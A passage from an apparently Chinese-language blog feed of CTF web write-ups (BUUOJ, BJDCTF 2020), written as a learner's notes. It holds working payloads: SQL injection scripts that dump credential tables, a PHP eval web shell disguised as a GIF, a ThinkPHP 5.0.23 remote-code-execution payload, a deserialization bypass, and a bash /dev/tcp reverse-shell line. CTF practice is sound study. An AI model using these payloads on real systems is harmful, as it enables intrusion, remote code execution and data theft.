class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">x-forwarded-for:127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="have-fun"><a href="#have-fun" class="headerlink" title="have_fun"></a>have_fun</h3><p><strong>撸猫吗？</strong><br>F12,发现了隐藏的提示，在下面的图里，根据提示尝试payload，就是<br><code>/index.php?cat=dog</code><br>一下子就成功了，还真是。。。<br>上图<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/02/GJ8T6U.png" alt="GJ8T6U.png"><br>完整payload:<code>http://362813f0-8e6d-4cfa-a13f-1a8f9575265c.node3.buuoj.cn/index.php?cat=dog</code></p><h3 id="secret-file"><a href="#secret-file" class="headerlink" title="secret_file"></a>secret_file</h3><p>再F12，发现隐藏的页面<code>Archive_room.php</code>.上图.<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/02/GJ03E8.png" alt="GJ03E8.png"></p><p>成功进入后发现另一个页面链接，另一个页面里啥都没有，用burp抓一下包看看吧!<br>上图,发现隐藏页面<code>secr3t.php</code><br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/02/GJ0Xrt.png" alt="GJ0Xrt.png"></p><p>出现了有一个关于flag的提示,上代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];  <span class="comment">//以get的方式获取一个文件夹名</span></span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问了<code>flag.php</code>，flag就在这，可是你就是看不到我。。。真气人。<br>到这里没多少思路了，看了wp，原来要用php伪协议<code>php://filter/convert.base64-encode/resource= *</code>这次我真的记住base64解一下密。<br>payload:<code>secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code><br>这个我是知道的，但是我就是没有大佬们会充分利用。学到了。。。就不上图了。上源码吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"我就在这里"</span>;</span><br><span class="line">    $flag = <span class="string">'flag&#123;d1d54e37-2fc9-44fb-8f5a-20b3ee6611d8&#125;'</span>;</span><br><span class="line">    $secret = <span class="string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="BUY-FLAG"><a href="#BUY-FLAG" class="headerlink" title="BUY_FLAG"></a>BUY_FLAG</h3><p>&ensp;&ensp;页面右上角有个<code>MENU</code>,点开有另一个页面<code>PAYFLAG</code>，点开这个页面有个<code>ATTENTION</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">attention</span><br><span class="line"></span><br><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!!</span><br></pre></td></tr></table></figure><p>提示:hint</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];  <span class="comment">/*接受post参量password*/</span></span><br><span class="line"><span class="keyword">if</span> (is_numeric($password)) &#123;     <span class="comment">/*判断纯数字的函数*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了wp<br>1/得用<code>BURPSUITE</code>更改请求头，cookies由<code>user=0</code>改为<code>user=1</code>,提交post</p><p>2/payload:<code>password = 404a &amp; money = 10e9</code> //后面的money似乎使用的是<code>strcmp ()</code>函数，然后有位数限制，用科学计数法可以绕过。</p><p><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/05/GrPB5t.png" alt="GrPB5t.png"></p><p>3/前面的<code>404a</code>就有点迷茫了。肯定能绕过第一层<code>is_numeric()</code>，但是是怎么绕过<code>($password == 404)</code>的有点不清楚。</p><p>4/.找到了点资料，补3，是松散比较(php弱类型比较)，<a href="https://blog.csdn.net/baidu_41871794/article/details/83750615" target="_blank" rel="noopener">CSDN里的一篇文章</a><br>文章里有详细的说明。下面的这些判断结果都为<code>true</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    var_dump(<span class="number">1</span>==<span class="string">"1"</span>);</span><br><span class="line">    var_dump(<span class="number">123</span>==<span class="string">'123asd'</span>);  <span class="comment">/*本篇利用的就是这个*/</span></span><br><span class="line">    var_dump(<span class="string">"1"</span>==<span class="keyword">true</span>);</span><br><span class="line">    var_dump(<span class="string">"0"</span>==<span class="keyword">false</span>);</span><br><span class="line">    var_dump(<span class="number">-1</span> == <span class="keyword">true</span>);</span><br><span class="line">    var_dump(<span class="keyword">true</span>==<span class="string">"php"</span>);</span><br><span class="line">    var_dump(<span class="number">0</span>==<span class="keyword">NULL</span>);</span><br><span class="line">    var_dump(<span class="number">0</span>==<span class="string">"php"</span>);</span><br><span class="line">    var_dump(<span class="number">0</span>==<span class="string">""</span>);</span><br><span class="line">    var_dump(<span class="keyword">NULL</span>==<span class="keyword">false</span>);</span><br><span class="line">    var_dump(<span class="string">""</span>==<span class="keyword">false</span>);</span><br><span class="line">    var_dump(<span class="keyword">array</span>()==<span class="keyword">false</span>);</span><br><span class="line">    var_dump(<span class="keyword">array</span>()==<span class="keyword">NULL</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>0/0先介绍一篇很好的基础文章&ensp;<a href="https://blog.csdn.net/weixin_40950781/article/details/100806729?utm_source=app" target="_blank" rel="noopener">来自CSDN</a></p><p>1/这个是反序列化的题目，首先考察的使文件备份，考虑了<code>index.php.bak</code>,然后没有检查到。。。然后看了wp，原来是在<code>www.zip</code>里边。(我又记住了)，下载下来。</p><p>2/看到wp重点是在<code>class.php</code>里，上图。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/08/GhK7kQ.png" alt="GhK7kQ.png"></p><p>3/素材(信息)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`index.php`里的</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/08/GhKxmT.png" alt="GhKxmT.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">`<span class="class"><span class="keyword">class</span>.<span class="title">php</span>`里的</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> '<span class="title">flag</span>.<span class="title">php</span>';</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4/<br>重点:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"animal"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">7</span>:<span class="string">"dahuang"</span>;&#125;</span><br><span class="line">对象类型:长度:<span class="string">"名字"</span>:类中变量的个数:&#123;类型:长度:<span class="string">"名字"</span>;类型:长度:<span class="string">"值"</span>;......&#125;</span><br></pre></td></tr></table></figure><p>payload:<code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;}</code></p><p>5/很明显，直接加payload没用，<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/08/GhMPh9.png" alt="GhMPh9.png"><br>贴上python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`python`脚本</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://5374af07-42ed-493d-80a4-8babf852e37c.node3.buuoj.cn/"</span>;</span><br><span class="line">html = requests.get(url + <span class="string">'?select=O:4:"Name":3:&#123;s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;&#125;'</span>)</span><br><span class="line">print(html.txt)</span><br></pre></td></tr></table></figure><p>6/找到你了，小宝贝。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/08/GhMKtH.png" alt="GhMKtH.png"></p><p>PS:<code>CVE-2016-7124漏洞：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code></p><h3 id="love-sql"><a href="#love-sql" class="headerlink" title="love_sql"></a>love_sql</h3><p>最近正在学习怎么使用python脚本,所以本题也是用python解决。<br>1/首先是<code>?username=1&amp;password=2&#39;</code>报错，追上<code>#</code>还是报错，缀上<code>%23</code>回显正常。判断是单引号字符注入。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/09/G4utXV.png" alt="G4utXV.png"><br>2/下面是python脚本，按照，payload0-payload4一步步注得flag。<br>图：<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/09/G4u1Yj.png" alt="G4u1Yj.png"><br>文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://bd31d7a1-4632-4fa4-9a71-d51f97e98a51.node3.buuoj.cn/check.php?"</span></span><br><span class="line"><span class="comment">#   payload</span></span><br><span class="line">payload0 = <span class="string">"username=admin&amp;password=1' union select 1,2,3 %23"</span>  <span class="comment">#不知道为啥#不行，只有混成%23才行。</span></span><br><span class="line">payload1 = <span class="string">"username=admin&amp;password=1' union select 1,2,group_concat(schema_name) from information_schema.schemata %23 "</span></span><br><span class="line">payload2 = <span class="string">"username=admin&amp;password=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' %23 "</span></span><br><span class="line">payload3 = <span class="string">"username=admin&amp;password=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' %23 "</span></span><br><span class="line">payload4 = <span class="string">"username=admin&amp;password=1' union select 1,2,group_concat(concat_ws(':',username,password)) from l0ve1ysq1 %23 "</span></span><br><span class="line"></span><br><span class="line">html = requests.get(url + payload4)</span><br><span class="line">print(html.text)</span><br></pre></td></tr></table></figure><h3 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h3><p>1./直接沾脚本，想说的都在脚本里了。<br>2./脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7fb38a7c-8e9b-4433-aa6d-fe39064754cf.node3.buuoj.cn/"</span></span><br><span class="line"><span class="comment">#   payload</span></span><br><span class="line">payload0 = <span class="string">"check.php?username=1' %23 &amp;password=2"</span> <span class="comment">#发现是单引号字符注入，注入点在username这里。</span></span><br><span class="line">payload1 = <span class="string">"check.php?username=1'oorrder bbyy 1,2,3,4 %23 &amp;password=2"</span> <span class="comment">#这个payload发现有3个columns。</span></span><br><span class="line">payload2 = <span class="string">"check.php?username=1' uniunionon selselectect 1,2,3 %23 &amp;password=2"</span> <span class="comment">#双写这两个是看得wp……</span></span><br><span class="line"><span class="comment">#   sql四部曲</span></span><br><span class="line">payload3 = <span class="string">"check.php?username=1' uniunionon selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata %23 &amp;password=2"</span> <span class="comment">#第一步，查库</span></span><br><span class="line">payload4 = <span class="string">"check.php?username=1' uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='geek' %23 &amp;password=2"</span> <span class="comment">#第二步，查表</span></span><br><span class="line">payload5= <span class="string">"check.php?username=1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema='geek' %23 &amp;password=2"</span> <span class="comment">#第三步，查列</span></span><br><span class="line">payload = <span class="string">"check.php?username=1' uniunionon selselectect 1,2,group_concat(concat_ws('::',username,passwoorrd)) frfromom b4bsql %23 &amp;password=2"</span> <span class="comment">#第四步，查值</span></span><br><span class="line"></span><br><span class="line">html = requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#   print</span></span><br><span class="line">print(html.text)</span><br></pre></td></tr></table></figure><p>3./再粘个wp的地址<a href="https://blog.csdn.net/SopRomeo/article/details/104024986" target="_blank" rel="noopener">来自CSDN</a><br>4./，ok，溜~</p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>一句话：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="keyword">eval</span>($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>文件头是gif类型的。</p><p>1/上传，burp修改文件类型。content-type:image/jpeg。文件名改为<code>1.phtml</code>。<br>2/找文件位置，在根目录upload文件夹里。<br>3/蚁剑连接。<br>4/打开终端，执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>得到flag。</p><h3 id="hard-sql"><a href="#hard-sql" class="headerlink" title="hard_sql"></a>hard_sql</h3><p>1/脚本如下，想记录的都在脚本里了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#我的题目url</span></span><br><span class="line">url = <span class="string">"http://303a5a92-678a-44ff-990d-5f8474f962a0.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="comment">#其中空格%20被过滤了。可以用()代替空格</span></span><br><span class="line">payload0 = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=2"</span></span><br><span class="line"><span class="comment">#常规四部曲</span></span><br><span class="line">payload1 = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=2"</span> <span class="comment">#库</span></span><br><span class="line">payload2 = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=2"</span> <span class="comment">#表</span></span><br><span class="line">payload3 = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=2"</span> <span class="comment">#字段</span></span><br><span class="line">payload4 = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(username,'-',password))from(H4rDsq1)),0x7e),1))%23&amp;password=2"</span> <span class="comment">#值</span></span><br><span class="line"><span class="comment">#爆出了左半部分，用下面的操作爆右半部分</span></span><br><span class="line"><span class="comment">#后面的里边的数字要左右微调，将flag拼接完整</span></span><br><span class="line">payload = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,27))))from(H4rDsq1)),0x7e),1))%23&amp;password=2"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#打印</span></span><br><span class="line">html = requests.get(url + payload)</span><br><span class="line">print(html.text)</span><br></pre></td></tr></table></figure><p>2/总结，这应该是我的首道报错注入的题目，对原理理解的不是太清楚，不过还好的是和联合查询注入的某些语句是一样的。<br>比如上面的有一个payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,27))))from(H4rDsq1)),0x7e),1))%23&amp;password=2"</span></span><br></pre></td></tr></table></figure><p>相似处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"check.php?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,27))))from(H4rDsq1)),0x7e),1))%23&amp;password=2"</span></span><br><span class="line">                                                              select(group_concat((right(password,<span class="number">27</span>))))<span class="keyword">from</span>(H4rDsq1)</span><br></pre></td></tr></table></figure><p>3/ps:<code>慢慢学吧！</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-BJDCTF</title>
      <link href="/2020/03/22/2020-BJDCTF/"/>
      <url>/2020/03/22/2020-BJDCTF/</url>
      
        <content type="html"><![CDATA[<h4 id="我会先尝试着做，然后等下周复现。"><a href="#我会先尝试着做，然后等下周复现。" class="headerlink" title="我会先尝试着做，然后等下周复现。"></a>我会先尝试着做，然后等下周复现。</h4><a id="more"></a><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>&ensp;&ensp;&ensp;这提示的是ssti(搜到是模板注入)<br><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html#commentform" target="_blank" rel="noopener">一篇文章</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">一篇入门文章</a><br>大佬总结的很全。。。直接用了他的payload。暂时还是看不太懂。。</p><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>1/因为提示了是think PHP5，然后查了一些thinkphp5的漏洞，发现有个代码执行漏洞，然后是<code>system error</code>，然后发现这个</p><p><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/29/GVi8PI.png" alt="GVi8PI.png"></p><p>2/然后就是执行5.0.23的专用利用。/.</p><p><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/29/GVAFaQ.png" alt="GVAFaQ.png"></p><p>3/payload-get:<code>index.php?s=captcha</code>.<br>./payload-post:<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag</code>.</p><p><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/29/GVkB3q.png" alt="GVkB3q.png"></p><h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>1/在Responses Header里发现了Hint:<code>home.php</code>.<br>2/robots.txt里发现了<code>admin.php</code></p><h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>1/<a href="https://www.cnblogs.com/jxl1996/p/10245958.html" target="_blank" rel="noopener">Header详解</a><br>2/根据wp可以知道这道题目是在http header上面做文章的。<br>3/使用burp抓包。<img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/29/GZndH0.png" alt="GZndH0.png">，发现了hint：<code>l0g1n.php</code><br>4/<code>Sorry, this site will be available after totally 99 years!</code>然后根据这个改header里边的时间。<br>5/<code>Cookie: PHPSESSID=8sriagpeaoat1euei9qj7du7t0; time=1585483810</code>有time这个东西(时间戳)。<br>6/用时间戳转换工具计算99年以后的时间戳，用burp更改time参数。回显<code>Sorry, this site is only optimized for those who comes from localhost</code><br>7/更改xff(X-Forwarded-For)为<code>127.0.0.1</code>,回显<code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive</code><br>8/将xff用<code>Client-IP</code>代替即可，回显<code>Sorry, this site is only optimized for those who come from gem-love.com</code>，可知要更改<code>Referer</code>.<br>9/更改Referer为所要求的Referer,回显<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code>,可知要更改<code>User-Agent</code>为所要求的UA。<br>10/更改UA后，UA为<code>Contiki/1.0 (Commodore 64; http://dunkels.com/adam/contiki/)</code>，回显<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code>,要更改<code>From:</code>为所要求的邮件地址。<br>11/更改邮件地址后，回显<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code>,本来以为要更改<code>Proxy-Authorization</code>，又看了眼wp才知道是要改Via为<code>y1ng.vip</code>。<br>12/终于找到了被隐藏的神秘符号了<code>&lt;!--ZmxhZ3s4Y2FkNjJhMi02ZTM3LTRkOGYtODA1NC0zMTRhNjQzNWU4Njd9Cg==--&gt;</code>Base64解密一下，<br>13/flag:<code>flag{8cad62a2-6e37-4d8f-8054-314a6435e867}</code></p><p>我的完整的Request:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;L0g1n.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:28191</span><br><span class="line">User-Agent: Contiki&#x2F;1.0 (Commodore 64; http:&#x2F;&#x2F;dunkels.com&#x2F;adam&#x2F;contiki&#x2F;)</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;8sriagpeaoat1euei9qj7du7t0; time&#x3D;4741157992</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">Referer:gem-love.com</span><br><span class="line">From:root@gem-love.com</span><br><span class="line">Via:y1ng.vip</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure><h3 id="duangshell"><a href="#duangshell" class="headerlink" title="duangshell"></a>duangshell</h3><p>反弹shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种换源</title>
